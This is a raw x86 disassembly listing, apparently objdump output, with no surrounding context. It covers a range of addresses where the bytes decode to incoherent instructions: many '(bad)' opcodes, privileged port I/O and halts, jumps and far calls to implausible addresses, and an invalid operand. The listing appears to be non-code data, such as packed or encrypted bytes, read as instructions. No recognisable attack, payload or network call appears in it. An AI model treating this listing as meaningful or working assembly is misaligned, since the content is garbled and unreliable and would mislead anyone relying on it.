  41cd7e:	outs   dx,DWORD PTR ds:[esi]
  41cd7f:	enter  0xe66b,0x70
  41cd83:	mov    eax,ds:0x995ef33d
  41cd88:	dec    ebp
  41cd89:	call   0x42518d
	...
  41cdb6:	pop    esp
  41cdb7:	out    0x71,eax
  41cdb9:	add    BYTE PTR [ebp+0x5b],0x70
  41cdbd:	mov    BYTE PTR [edx-0x16],cl
  41cdc0:	inc    DWORD PTR [edi-0x77a0ffe4]
  41cdc6:	sbb    al,0x5b
  41cdc8:	ss mov ah,0xf1
  41cdcb:	sub    esi,DWORD PTR [edx]
  41cdcd:	sbb    BYTE PTR [edx],bh
  41cdcf:	add    BYTE PTR [ebx+0x48],ch
  41cdd2:	sub    bh,dh
  41cdd4:	pop    esi
  41cdd5:	jmp    0x41b5bbfd
  41cdda:	sbb    esi,ecx
  41cddc:	fs jmp 0x46afc5fa
  41cde2:	addr16 in eax,dx
  41cde4:	inc    DWORD PTR [ebx+0x61]
  41cde7:	out    0x67,eax
  41cde9:	inc    esp
  41cdea:	ins    BYTE PTR es:[edi],dx
  41cdeb:	pop    ebx
  41cdec:	jno    0x41ce05
  41cdee:	push   ecx
  41cdef:	out    dx,al
  41cdf0:	outs   dx,DWORD PTR ds:[esi]
  41cdf1:	and    BYTE PTR [edx-0xb],al
  41cdf4:	bound  ebx,QWORD PTR [edx]
  41cdf6:	dec    ebp
  41cdf7:	clc    
  41cdf8:	pusha  
  41cdf9:	or     BYTE PTR [edx-0x1a],al
  41cdfc:	bound  edx,QWORD PTR ds:0x46aee5d
  41ce02:	inc    edx
  41ce03:	jmp    0x41ce71
  41ce05:	add    ah,BYTE PTR [edi]
  41ce07:	hlt    
  41ce08:	ins    BYTE PTR es:[edi],dx
  41ce09:	(bad)  
  41ce0a:	cmp    eax,0x2bd66bf8
  41ce0f:	cld    
  41ce10:	jbe    0x41cde0
  41ce12:	push   ss
  41ce13:	xor    BYTE PTR [eax],al
  41ce15:	sbb    BYTE PTR [ebx+0x31],cl
  41ce18:	das    
  41ce19:	sbb    BYTE PTR [eax],al
	...
  41ce43:	add    BYTE PTR [edx-0xc],al
  41ce46:	jb     0x41ce48
  41ce48:	test   BYTE PTR [eax],ch
  41ce4a:	pop    ebp
  41ce4b:	outs   dx,BYTE PTR ds:[esi]
  41ce4c:	add    BYTE PTR [eax+ebp*2+0x65],bl
  41ce50:	sti    
  41ce51:	sub    ebp,DWORD PTR [ecx+0x65]
  41ce54:	pop    ss
  41ce55:	xor    dh,BYTE PTR [ecx+0x73]
  41ce58:	ret    
  41ce59:	outs   dx,BYTE PTR cs:[esi]
  41ce5b:	add    BYTE PTR [ebp-0x419290ca],ch
  41ce61:	sub    eax,0x2a880061
  41ce66:	pop    ebp
  41ce67:	outs   dx,BYTE PTR ds:[esi]
  41ce68:	mov    al,0x32
  41ce6a:	add    BYTE PTR [edx+eax*8+0x2c],dh
  41ce6e:	je     0x41ced9
  41ce70:	mov    ecx,0x67610038
  41ce75:	sub    al,0x6c
  41ce77:	xlat   BYTE PTR gs:[ebx]
  41ce79:	sub    ah,BYTE PTR [ebp+0x63]
  41ce7c:	outs   dx,DWORD PTR ds:[esi]
  41ce7d:	xor    ch,BYTE PTR [esp+ebp*2-0x7e]
  41ce81:	push   edi
  41ce82:	jo     0x41cee9
  41ce84:	jbe    0x41cec2
  41ce86:	popa   
  41ce87:	add    BYTE PTR [edx+esi*1],al
  41ce8a:	pop    edi
  41ce8b:	jb     0x41ce8f
  41ce8d:	and    eax,DWORD PTR [eax]
  41ce8f:	xor    DWORD PTR [edi-0xb9e8dc8],esp
  41ce95:	xor    DWORD PTR [eax],eax
  41ce97:	ja     0x41cee7
  41ce99:	sub    ebp,DWORD PTR [ecx+ebp*2+0x46]
  41ce9d:	sub    al,BYTE PTR [eax]
  41ce9f:	imul   edi,DWORD PTR [ebx],0x2e657630
  41cea5:	xor    BYTE PTR [ecx+0x32],dh
	...
  41ced0:	add    BYTE PTR [eax],al
  41ced2:	xchg   edi,eax
  41ced3:	sub    eax,0x2b486365
  41ced8:	popa   
  41ced9:	add    BYTE PTR [ecx-0x4ec9cc9b],dh
  41cedf:	gs std 
  41cee1:	ins    BYTE PTR es:[edi],dx
  41cee2:	xor    BYTE PTR ds:0x5b896966,0x63
  41cee9:	popa   
  41ceea:	ds jle 0x41cf15
  41ceed:	jne    0x41cece
  41ceef:	mov    al,BYTE PTR [ecx]
  41cef1:	retfw  
  41cef3:	xchg   esp,eax
  41cef4:	sub    dh,BYTE PTR [edi-0x57]
  41cef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cef8:	hlt    
  41cef9:	call   FWORD PTR [esi-0x6697cd5f]
  41ceff:	mov    al,ds:0xd3960028
  41cf04:	sub    DWORD PTR [edi-0x5a],ebx
  41cf07:	rol    DWORD PTR [ecx],cl
  41cf09:	jo     0x41ceac
  41cf0b:	aad    0x31
  41cf0d:	add    BYTE PTR [eax+eiz*8-0x34728ed9],bl
  41cf14:	sub    esp,DWORD PTR [ebp+0x3e]
  41cf17:	shr    BYTE PTR ds:0x2dd2665f,cl
  41cf1d:	pop    edi
  41cf1e:	push   esi
  41cf1f:	je     0x41cf51
  41cf21:	ja     0x41cf90
  41cf23:	add    al,0x21
  41cf25:	popa   
  41cf26:	arpl   WORD PTR [ebx+0x4],ax
  41cf29:	imul   ebx,DWORD PTR [edi+0x0],0x38
  41cf2d:	push   0x61040563
  41cf32:	pop    edi
  41cf33:	push   es
  41cf34:	and    DWORD PTR [eax+eax*1+0x0],esp
	...
  41cf60:	pop    ds
  41cf61:	je     0x41cf93
  41cf63:	and    bl,BYTE PTR ds:0x7225
  41cf68:	and    ch,BYTE PTR ds:[ebx]
  41cf6b:	bound  ebx,QWORD PTR [ebx]
  41cf6d:	inc    edx
  41cf6e:	cmp    BYTE PTR [eax],al
  41cf70:	and    BYTE PTR [ebp+0x32],cl
  41cf73:	arpl   WORD PTR [eax],cx
  41cf75:	dec    edi
  41cf76:	xor    al,BYTE PTR [eax]
  41cf78:	pop    ds
  41cf79:	inc    ecx
  41cf7a:	sub    BYTE PTR [esi+0x19],ah
  41cf7d:	dec    esp
  41cf7e:	add    al,0x72
  41cf80:	fist   WORD PTR [eax+0x2c]
  41cf83:	arpl   dx,sp
  41cf85:	jae    0x41cfb6
  41cf87:	pop    edi
  41cf88:	xlat   BYTE PTR ds:[ebx]
  41cf89:	pop    ebp
  41cf8a:	pop    ds
  41cf8b:	ins    DWORD PTR es:[edi],dx
  41cf8c:	jmp    0xcd66b6eb
  41cf91:	repz shl BYTE PTR [edx],cl
  41cf94:	int3   
  41cf95:	pop    edx
  41cf96:	xlat   BYTE PTR ds:[ebx]
  41cf97:	es jmp 0x3e79a389
  41cf9d:	stc    
  41cf9e:	(bad)  
  41cf9f:	aaa    
  41cfa0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfa1:	cld    
  41cfa2:	int3   
  41cfa3:	add    ebx,DWORD PTR [edi-0x5ed73a12]
  41cfa9:	clc    
  41cfaa:	out    0x21,al
  41cfac:	xor    esp,0x5b912692
  41cfb2:	call   0x5931:0x8bfa9f2c
  41cfb9:	pop    ebx
  41cfba:	jl     0x41cfe6
  41cfbc:	lahf   
  41cfbd:	repnz mov edi,DWORD PTR [edx]
  41cfc0:	ds stc 
  41cfc2:	(bad)  
  41cfc3:	aaa    
	...
  41cfec:	add    BYTE PTR [eax],al
  41cfee:	pop    ebp
  41cfef:	lock mov eax,DWORD PTR [ebx]
  41cff2:	push   esi
  41cff3:	clc    
  41cff4:	jp     0x41d025
  41cff6:	push   ebx
  41cff7:	sub    al,0xe7
  41cff9:	es gs hlt 
  41cffc:	dec    esp
  41cffd:	daa    
  41cffe:	gs pop ebx
  41d000:	dec    ebx
  41d001:	and    edx,DWORD PTR [edi-0x12]
  41d004:	push   edx
  41d005:	and    edi,DWORD PTR [esi]
  41d007:	jmp    0x2c32:0xed192f47
  41d00e:	adc    DWORD PTR [ebx+0x4a],ebx
  41d011:	sub    eax,0x3347eb15
  41d016:	test   DWORD PTR ds:[edi],0xcee2523
  41d01d:	sub    BYTE PTR [esi],bh
  41d01f:	out    0x7,eax
  41d021:	cmp    ebx,DWORD PTR [edx]
  41d023:	out    dx,al
  41d024:	sbb    BYTE PTR [eax+ebx*1],al
  41d027:	out    dx,al
  41d028:	clc    
  41d029:	ss in  eax,0x5a
  41d02c:	adc    DWORD PTR ds:0xb9ffece6,ebp
  41d032:	ins    BYTE PTR es:[edi],dx
  41d033:	daa    
  41d034:	add    bl,bh
  41d036:	adc    al,0xfc
  41d038:	addr16 enter 0xf70f,0xff
  41d03d:	retf   0xf621
  41d040:	ins    DWORD PTR es:[edi],dx
  41d041:	ret    0x254c
  41d044:	xor    ch,cl
  41d046:	or     eax,0x65ca5efa
  41d04b:	clc    
  41d04c:	jo     0x41d037
  41d04e:	pop    esi
  41d04f:	out    dx,al
  41d050:	ins    BYTE PTR es:[edi],dx
  41d051:	lds    eax,FWORD PTR [eax]
	...
  41d07b:	add    BYTE PTR ds:0x6abe6bf5,bh
  41d081:	clc    
  41d082:	jno    0x41d06d
  41d084:	dec    esi
  41d085:	cli    
  41d086:	ins    BYTE PTR es:[edi],dx
  41d087:	mov    cs,WORD PTR [ecx-0x8]
  41d08a:	jno    0x41d075
  41d08c:	pop    edi
  41d08d:	cld    
  41d08e:	ins    DWORD PTR es:[edi],dx
  41d08f:	mov    BYTE PTR [ebx-0x4],dl
  41d092:	call   DWORD PTR [edx+0x7a62f01c]
  41d098:	cmp    eax,0x238d70fc
  41d09d:	cld    
  41d09e:	jo     0x41d025
  41d0a0:	sbb    ebx,DWORD PTR [ebx+0x76]
  41d0a3:	push   eax
  41d0a4:	and    edi,esp
  41d0a6:	ins    BYTE PTR es:[edi],dx
  41d0a7:	pop    ebx
  41d0a8:	adc    ebx,DWORD PTR [ebx+0x6c]
  41d0ab:	inc    esi
  41d0ac:	adc    al,0xf7
  41d0ae:	ins    BYTE PTR es:[edi],dx
  41d0af:	aas    
  41d0b0:	cmp    ch,BYTE PTR [edx+esi*1]
  41d0b3:	cli    
  41d0b4:	jb     0x41d09c
  41d0b6:	(bad)  
  41d0b7:	jmp    0xfa72fb66
  41d0bc:	mov    bl,0x2d
  41d0be:	add    BYTE PTR [edx],bh
  41d0c0:	outs   dx,BYTE PTR ds:[esi]
  41d0c1:	cld    
  41d0c2:	jno    0x41d0e1
  41d0c4:	push   eax
  41d0c5:	clc    
  41d0c6:	push   0x6cf85ce9
  41d0cb:	sbb    ebx,DWORD PTR [ebp-0x8]
  41d0ce:	call   DWORD PTR ds:0x6ded53
  41d0d4:	dec    edx
  41d0d5:	and    eax,0x38466d00
  41d0da:	arpl   WORD PTR [ecx+0x3a],bp
  41d0dd:	push   edi
  41d0de:	je     0x41d152
	...
  41d108:	add    BYTE PTR [eax],al
  41d10a:	xor    DWORD PTR ds:[ebp+0x74],esp
  41d10e:	pop    esi
  41d10f:	pop    eax
  41d110:	imul   ebp,DWORD PTR [esi-0x7d],0x2f
  41d114:	outs   dx,BYTE PTR ds:[esi]
  41d115:	gs push edi
  41d117:	addr16 das 
  41d119:	xor    esi,DWORD PTR [esi+0x36]
  41d11c:	pop    edi
  41d11d:	add    BYTE PTR [eax+esi*1],al
  41d120:	arpl   WORD PTR gs:[ebx+edi*1],cx
  41d124:	outs   dx,BYTE PTR ds:[esi]
  41d125:	add    ch,bh
  41d127:	sub    ch,BYTE PTR [esi+0x69]
  41d12a:	loopne 0x41d151
  41d12c:	add    BYTE PTR [ebx-0x51],ah
  41d12f:	and    eax,0x28277365
  41d134:	pop    ebp
  41d135:	jae    0x41d0db
  41d137:	sub    BYTE PTR [eax],dh
  41d139:	jb     0x41d0f6
  41d13b:	push   edi
  41d13c:	pop    ebp
  41d13d:	jne    0x41d1b3
  41d13f:	sub    al,0x65
  41d141:	outs   dx,BYTE PTR ds:[esi]
  41d142:	out    0x24,eax
  41d144:	jo     0x41d1a7
  41d146:	gs sub eax,0x3bb60075
  41d14c:	imul   ebp,DWORD PTR [ecx+0x71],0x75656957
  41d153:	xor    esp,DWORD PTR [ebp+0x6e]
  41d156:	xlat   BYTE PTR ds:[ebx]
  41d157:	cmp    BYTE PTR [ebx+0x6f],ch
  41d15a:	js     0x41d18f
  41d15c:	popa   
  41d15d:	add    BYTE PTR [ecx],cl
  41d15f:	and    eax,0x3b016565
  41d164:	outs   dx,DWORD PTR ds:[esi]
  41d165:	add    bh,bh
  41d167:	das    
  41d168:	jo     0x41d1cf
  41d16a:	xchg   edi,eax
  41d16b:	and    al,0x68
  41d16d:	popa   
	...
  41d196:	add    BYTE PTR [eax],al
  41d198:	xor    esi,DWORD PTR [eax]
  41d19a:	imul   eax,DWORD PTR [eax],0x746e2e41
  41d1a0:	ds dec edi
  41d1a2:	sub    ah,BYTE PTR [ecx+edx*1+0x72]
  41d1a6:	and    eax,0x2b48e96d
  41d1ab:	outs   dx,BYTE PTR ds:[esi]
  41d1ac:	fnstenv [ecx+0x29]
  41d1af:	pop    edi
  41d1b0:	in     al,dx
  41d1b1:	push   ebp
  41d1b2:	pop    ds
  41d1b3:	ja     0x41d1f3
  41d1b5:	popa   
  41d1b6:	sub    BYTE PTR [ebp-0x1b],ch
  41d1b9:	mov    ?,WORD PTR [eax+eax*1]
  41d1bc:	or     DWORD PTR [ebp-0xf],eax
  41d1bf:	xor    al,0x3e
  41d1c1:	cwde   
  41d1c2:	sub    dh,BYTE PTR [ecx-0x25]
  41d1c5:	sub    DWORD PTR [ecx],0x2617aa00
  41d1cb:	imul   esi,DWORD PTR [edi-0x5e98e2bc],0x925f2d1b
  41d1d5:	inc    esp
  41d1d6:	and    al,0x0
  41d1d8:	xchg   edx,eax
  41d1d9:	in     al,dx
  41d1da:	das    
  41d1db:	outs   dx,BYTE PTR ds:[esi]
  41d1dc:	call   0x2bf4:0x8d0032df
  41d1e3:	jb     0x41d17c
  41d1e5:	lock add BYTE PTR [edx+0x5f],ah
  41d1e9:	repnz sbb al,0x67
  41d1ec:	push   0x44
  41d1ee:	and    BYTE PTR [esi+0x72],ch
  41d1f1:	out    0x32,eax
  41d1f3:	add    BYTE PTR [edi-0x26],bl
  41d1f6:	sub    eax,0x39b26968
	...
  41d223:	add    BYTE PTR [eax],al
  41d225:	add    BYTE PTR [ebp-0x57],bl
  41d228:	ss jbe 0x41d28e
  41d22b:	mov    eax,0x9c3e6330
  41d230:	daa    
  41d231:	popa   
  41d232:	and    eax,0x2e0039a7
  41d237:	test   eax,0x442c632f
  41d23c:	and    esp,DWORD PTR [ebx+0x10]
  41d23f:	sahf   
  41d240:	and    DWORD PTR [ebx+0x27],ebp
  41d243:	pop    ebx
  41d244:	adc    eax,0xec71904
  41d249:	xor    bl,BYTE PTR ds:0x212f06d4
  41d24f:	pop    ebx
  41d250:	fdiv   DWORD PTR [edx]
  41d252:	sub    al,0xd2
  41d254:	mov    edx,0x10d13e1e
  41d259:	xor    al,0xdd
  41d25b:	int3   
  41d25c:	out    0x20,eax
  41d25e:	(bad)  
  41d260:	add    al,0x35
  41d262:	loope  0x41d231
  41d264:	out    0x2c,eax
  41d266:	loopne 0x41d22b
  41d268:	(bad)  
  41d269:	sub    edx,edx
  41d26b:	pop    edx
  41d26c:	fdiv   DWORD PTR [eax]
  41d26e:	(bad)  
  41d270:	sar    DWORD PTR [edx],cl
  41d272:	imul   ebx,DWORD PTR [ebx-0x36],0xb3bc9d35
  41d279:	sub    dh,BYTE PTR [eax-0x6cde1840]
  41d27f:	retf   0x22c9
  41d282:	mov    WORD PTR [ebx-0x78],ds
  41d285:	pop    ds
  41d286:	cdq    
  41d287:	mov    edi,0x3488
	...
  41d2b4:	ds int 0x86
  41d2b7:	das    
  41d2b8:	cdq    
  41d2b9:	enter  0x380,0x6f
  41d2bd:	(bad)  
  41d2be:	mov    BYTE PTR [edx],bh
  41d2c0:	pop    ebp
  41d2c1:	int    0xe7
  41d2c3:	xor    BYTE PTR [ecx-0x32],ah
  41d2c6:	mov    ebp,DWORD PTR [eax]
  41d2c8:	push   ebp
  41d2c9:	pop    ebx
  41d2ca:	ja     0x41d301
  41d2cc:	jns    0x41d292
  41d2ce:	pop    edx
  41d2cf:	pop    ds
  41d2d0:	ds aad 0x5f
  41d2d3:	and    eax,0x2745bd50
  41d2d8:	ds into 
  41d2da:	dec    eax
  41d2db:	daa    
  41d2dc:	sub    eax,0x250453c0
  41d2e1:	les    edx,FWORD PTR [edx+0x1f]
  41d2e4:	ds mov edi,0xc7564800
  41d2ea:	pop    edi
  41d2eb:	cmp    al,BYTE PTR [edx-0x40]
  41d2ee:	jb     0x41d2fc
  41d2f0:	xor    ecx,ecx
  41d2f2:	add    BYTE PTR ds:0x1d74cc29,dl
  41d2f8:	and    esp,ecx
  41d2fa:	je     0x41d2e5
  41d2fc:	and    BYTE PTR [edx-0x3dd7f38a],bh
  41d302:	popa   
  41d303:	adc    al,BYTE PTR [edx-0x38]
  41d306:	outs   dx,BYTE PTR ds:[esi]
  41d307:	or     al,0x16
  41d309:	enter  0x476,0x42
  41d30d:	mov    edi,0xbf24df5f
  41d312:	add    ah,cl
  41d314:	add    al,0xc7
  41d316:	ins    DWORD PTR es:[edi],dx
  41d317:	fild   WORD PTR [eax]
	...
  41d341:	add    BYTE PTR [eax],ah
  41d343:	pop    ebx
  41d344:	popa   
  41d345:	shr    DWORD PTR [eax-0x33],0x61
  41d349:	sar    DWORD PTR ds:0x48d072c1,1
  41d34f:	leave  
  41d350:	fs jmp 0xe9a699b4
  41d356:	cmp    DWORD PTR [ecx+esi*2+0x77c9649d],edi
  41d35d:	jmp    0x8cb099b9
  41d362:	cmp    eax,0x338a67c4
  41d367:	(bad)  
  41d368:	jno    0x41d300
  41d36a:	pop    ds
  41d36b:	iret   
  41d36c:	add    BYTE PTR [ebx-0x44cd750d],bh
  41d372:	jmp    0x41d3cc
  41d374:	pop    edi
  41d375:	je     0x41d39a
  41d377:	mov    ebp,0x5b0d4c6c
  41d37c:	das    
  41d37d:	sbb    bl,dl
  41d37f:	mov    DWORD PTR [edi],ebp
  41d381:	sbb    bl,cl
  41d383:	mov    DWORD PTR [eax],eax
  41d385:	dec    edx
  41d386:	popa   
  41d387:	mov    edx,0x8004005f
  41d38c:	ins    BYTE PTR es:[edi],dx
  41d38d:	popa   
  41d38e:	xchg   edi,eax
  41d38f:	sub    BYTE PTR [ebx+0x72],0xf3
  41d393:	jge    0x41d403
  41d395:	xor    dl,BYTE PTR [esp+ebx*2-0x76d7939b]
  41d39c:	popa   
  41d39d:	cmp    BYTE PTR [bp+di+0x0],bh
  41d3a1:	data16 cmp BYTE PTR [eax+0x6274],al
	...
  41d3d0:	inc    esi
  41d3d1:	sub    DWORD PTR [ecx+esi*1+0x67],0xffffff80
  41d3d6:	imul   esi,DWORD PTR [esi+0x4e],0xffffff81
  41d3da:	arpl   WORD PTR [eax],ax
  41d3dc:	cmp    DWORD PTR [esi+0x74],edi
  41d3df:	push   0x65008146
  41d3e4:	push   0xffffff83
  41d3e6:	pop    ebp
  41d3e7:	outs   dx,BYTE PTR ds:[esi]
  41d3e8:	jb     0x41d465
  41d3ea:	ins    BYTE PTR es:[edi],dx
  41d3eb:	add    BYTE PTR [ebp+edi*2+0x6b],ah
  41d3ef:	outs   dx,DWORD PTR ds:[esi]
  41d3f0:	add    eax,0xf2660097
  41d3f5:	jl     0x41d45e
  41d3f7:	outs   dx,DWORD PTR ds:[esi]
  41d3f8:	add    DWORD PTR [esi+0x0],esi
  41d3fb:	jae    0x41d3f3
  41d3fd:	sub    BYTE PTR [ecx+0x79],0x27
  41d401:	sbb    DWORD PTR [ebp+0x78],0xffffffb0
  41d405:	jp     0x41d473
  41d407:	ins    BYTE PTR es:[edi],dx
  41d408:	pop    ss
  41d409:	sbb    BYTE PTR [ebp+0x73],0xb8
  41d40d:	jge    0x41d40f
  41d40f:	push   0x78
  41d411:	test   BYTE PTR [esi+0x0],ch
  41d414:	mov    dh,0x8e
  41d416:	xor    dh,BYTE PTR [edi-0x5c]
  41d419:	jp     0x41d44f
  41d41b:	jb     0x41d3f4
  41d41d:	jns    0x41d47c
  41d41f:	bound  ecx,QWORD PTR [esi+0x5c]
  41d422:	jb     0x41d489
  41d424:	or     DWORD PTR [esi+0x2f],0x33
  41d428:	xlat   BYTE PTR ds:[ebx]
  41d429:	jns    0x41d497
  41d42b:	popa   
  41d42c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d42e:	sub    BYTE PTR [edi+0x3e],bl
  41d431:	mov    dl,0x32
  41d433:	add    BYTE PTR [bx+si],al
	...
  41d45e:	and    BYTE PTR [ebp-0x6ed0ffe1],ah
  41d464:	pop    ds
  41d465:	jb     0x41d491
  41d467:	inc    edx
  41d468:	and    ch,BYTE PTR [eax+0x23]
  41d46b:	xchg   esi,eax
  41d46c:	xor    DWORD PTR [ebx+0x1f],esp
  41d46f:	inc    edx
  41d470:	lock xor dl,BYTE PTR [ebx+0x2f]
  41d474:	lock call FWORD PTR [esi]
  41d477:	pusha  
  41d478:	sbb    eax,0x132ea63
  41d47d:	push   0x611d53df
  41d482:	fst    DWORD PTR [ebx+0x20]
  41d485:	add    dl,bl
  41d487:	data16 cmp al,0x74
  41d48a:	jecxz  0x41d4df
  41d48c:	add    DWORD PTR [ecx-0x21],esi
  41d48f:	aaa    
  41d490:	and    BYTE PTR [esi+edi*1+0x73],ah
  41d494:	repz xor DWORD PTR [esi*2+0x23a1fff1],ecx
  41d49c:	and    eax,0x2744a16c
  41d4a1:	pop    edi
  41d4a2:	lods   eax,DWORD PTR ds:[esi]
  41d4a3:	adc    al,0x20
  41d4a5:	jb     0x41d4e5
  41d4a7:	sub    BYTE PTR [esi+ebp*2],ah
  41d4aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4ab:	pop    ds
  41d4ac:	and    eax,0x2a449b6c
  41d4b1:	addr16 xchg edx,eax
  41d4b3:	lock pop ds
  41d4b5:	outs   dx,BYTE PTR ds:[esi]
  41d4b6:	ds loope 0x41d4dc
  41d4b9:	jno    0x41d528
  41d4bb:	fistp  DWORD PTR [edi]
  41d4bd:	add    BYTE PTR [ebp-0x28],ch
  41d4c0:	and    BYTE PTR [eax+eax*1+0x0],ch
	...
  41d4ec:	pop    edx
  41d4ed:	jecxz  0x41d4ef
  41d4ef:	jo     0x41d55d
  41d4f1:	jecxz  0x41d52e
  41d4f3:	arpl   WORD PTR [esp+eax*2+0x29],cx
  41d4f7:	ins    DWORD PTR es:[edi],dx
  41d4f8:	dec    edx
  41d4f9:	pop    ebx
  41d4fa:	dec    ebx
  41d4fb:	and    eax,0x2b565b63
  41d500:	push   eax
  41d501:	mov    edi,0x5b2f2d46
  41d506:	cmp    al,0x2f
  41d508:	das    
  41d509:	iret   
  41d50a:	dec    ebx
  41d50b:	sub    ebx,DWORD PTR ds:0x2a23465b
  41d511:	sar    BYTE PTR [edx],0x4
  41d514:	sbb    al,0xc4
  41d516:	cmp    ebp,DWORD PTR [eax]
  41d518:	sbb    edi,DWORD PTR [ebx+ebx*1+0x65b0f1f]
  41d51f:	sub    al,0x1c
  41d521:	mov    edi,0xbe3e261b
  41d526:	add    eax,0x14c1e42c
  41d52b:	add    al,0x19
  41d52d:	mov    DWORD PTR [edx-0x4172d311],edi
  41d533:	sti    
  41d534:	adc    BYTE PTR [ebx-0x3122fc19],cl
  41d53a:	loop   0x41d56d
  41d53c:	rol    cl,1
  41d53e:	into   
  41d53f:	xor    eax,edx
  41d541:	int    0xdc
  41d543:	add    esp,DWORD PTR [esi+0x7433d3cf]
  41d549:	xchg   BYTE PTR [esi],dl
  41d54b:	xor    DWORD PTR [ebp+0x20b9bc],ebx
	...
  41d579:	add    BYTE PTR [ebp-0x70cc4844],bl
  41d57f:	test   edx,ecx
  41d581:	and    al,0xa5
  41d583:	xchg   ecx,eax
  41d584:	fcomip st,st(3)
  41d586:	push   ecx
  41d587:	mov    ecx,esi
  41d589:	xor    edx,DWORD PTR [ebx+0x62e490c5]
  41d58f:	mov    esp,0xcb201e93
  41d594:	(bad)  
  41d595:	xor    edi,DWORD PTR [esi]
  41d597:	pop    ebx
  41d598:	(bad)  
  41d599:	das    
  41d59a:	push   0xffffffcb
  41d59c:	add    BYTE PTR [ebx+0x767586e2],dh
  41d5a2:	and    al,BYTE PTR [ebp-0x43f0a392]
  41d5a8:	addr16 dec esp
  41d5aa:	and    DWORD PTR [edi-0x455fb799],edi
  41d5b0:	ins    DWORD PTR es:[edi],dx
  41d5b1:	cmp    al,0x9b
  41d5b3:	mov    ebx,0xb9122b54
  41d5b8:	cs inc esp
  41d5ba:	bound  edi,QWORD PTR [edx-0x30b1bf00]
  41d5c0:	jo     0x41d5b5
  41d5c2:	call   0x63c9:0x551d7186
  41d5c9:	or     BYTE PTR [esi-0x46],bl
  41d5cc:	bound  ecx,QWORD PTR [eax]
  41d5ce:	pop    ds
  41d5cf:	mov    dh,0x73
  41d5d1:	mov    edi,0xc2dc82f
  41d5d6:	and    eax,0x40cf6d8f
  41d5db:	shl    DWORD PTR [ebx-0x17],cl
	...
  41d606:	add    BYTE PTR [eax],al
  41d608:	and    eax,0x57f974cf
  41d60d:	xchg   BYTE PTR ds:0x72b619da,ch
  41d613:	aad    0x1c
  41d615:	mov    ebp,0xbc61c066
  41d61a:	pop    edi
  41d61b:	aad    0x50
  41d61d:	rcr    BYTE PTR [edi-0x45],0x56
  41d621:	mov    eax,0xbe5bd074
  41d626:	cs retf 0xc062
  41d62a:	sub    eax,0x33c47c9b
  41d62f:	xlat   BYTE PTR ds:[ebx]
  41d630:	sub    bl,dl
  41d632:	arpl   cx,bp
  41d634:	cmp    eax,0x8da053ac
  41d639:	scas   al,BYTE PTR es:[edi]
  41d63a:	inc    esp
  41d63b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d63c:	test   BYTE PTR [edi-0x4e58ffbd],ah
  41d642:	push   ecx
  41d643:	dec    ecx
  41d644:	(bad)  
  41d645:	mov    ds:0x9c9e4644,eax
  41d64a:	inc    ecx
  41d64b:	xor    BYTE PTR [esi+0x54345a5],ch
  41d651:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d652:	push   eax
  41d653:	push   esp
  41d654:	sbb    ah,BYTE PTR [ebx-0x6985a6d0]
  41d65a:	sub    eax,0x5f572e
  41d65f:	add    BYTE PTR [edi+0x52000258],dl
  41d665:	cwde   
  41d666:	inc    esp
  41d667:	push   ebp
  41d668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d669:	pop    edi
	...
  41d696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d697:	pop    eax
  41d698:	add    BYTE PTR [eax],al
  41d69a:	xchg   edi,eax
  41d69b:	pop    eax
  41d69c:	dec    edi
  41d69d:	dec    edi
  41d69e:	pop    ecx
  41d69f:	mov    bl,0x53
  41d6a1:	inc    ecx
  41d6a2:	xor    eax,0x3e4d5ca2
  41d6a7:	jl     0x41d71b
  41d6a9:	outs   dx,DWORD PTR ds:[esi]
  41d6aa:	fs jns 0x41d713
  41d6ad:	je     0x41d6f2
  41d6af:	mov    al,0x65
  41d6b1:	outs   dx,BYTE PTR ds:[esi]
  41d6b2:	dec    ebx
  41d6b3:	js     0x41d728
  41d6b5:	jae    0x41d6fa
  41d6b7:	pushf  
  41d6b8:	jno    0x41d72c
  41d6ba:	sub    DWORD PTR gs:[esi+0x74],0xffffff89
  41d6bf:	xor    DWORD PTR [edx+0x73],0xfffffffe
  41d6c3:	js     0x41d733
  41d6c5:	pop    esp
  41d6c6:	jmp    0x5d8b:0xe46e6579
  41d6cd:	ins    BYTE PTR es:[edi],dx
  41d6ce:	repz push edi
  41d6d0:	push   ecx
  41d6d1:	outs   dx,BYTE PTR ds:[esi]
  41d6d2:	(bad)  
  41d6d3:	jns    0x41d744
  41d6d5:	je     0x41d6dd
  41d6d7:	je     0x41d745
  41d6d9:	push   ebx
  41d6da:	stos   DWORD PTR es:[edi],eax
  41d6db:	lea    esp,[ebp+0x6e]
  41d6de:	mov    eax,0x3e694457
  41d6e3:	icebp  
  41d6e4:	xor    BYTE PTR [edi+ebx*2-0x15],ch
  41d6e8:	ds pop edi
  41d6ea:	pop    ebx
  41d6eb:	out    0x0,eax
  41d6ed:	pop    esp
  41d6ee:	ds inc edx
  41d6f0:	add    DWORD PTR [eax],eax
  41d6f2:	ds inc edx
  41d6f4:	add    DWORD PTR [eax],eax
  41d6f6:	ds adc al,0x28
  41d6f9:	js     0x41d6fb
	...
  41d723:	add    BYTE PTR [ebx+0x42],ah
  41d726:	push   esi
  41d727:	ins    DWORD PTR es:[edi],dx
  41d728:	pop    eax
  41d729:	scas   al,BYTE PTR es:[edi]
  41d72a:	cmp    DWORD PTR [edi+0x2c],ebx
  41d72d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d72e:	push   eax
  41d72f:	push   ebp
  41d730:	daa    
  41d731:	xchg   esp,eax
  41d732:	push   esi
  41d733:	aas    
  41d734:	or     al,0x42
  41d736:	and    dh,BYTE PTR [eax+0x1b]
  41d739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d73a:	add    al,0xff
  41d73c:	cdq    
  41d73d:	inc    ecx
  41d73e:	sub    DWORD PTR [ecx+0x1b],0x1a632290
  41d745:	xor    ebx,esi
  41d747:	sub    eax,0x20661a
  41d74c:	adc    DWORD PTR [esi+0x6ddb4555],edx
  41d752:	inc    ebx
  41d753:	popa   
  41d754:	repnz push 0x3a
  41d757:	arpl   bp,di
  41d759:	and    dh,BYTE PTR fs:[ecx-0x17]
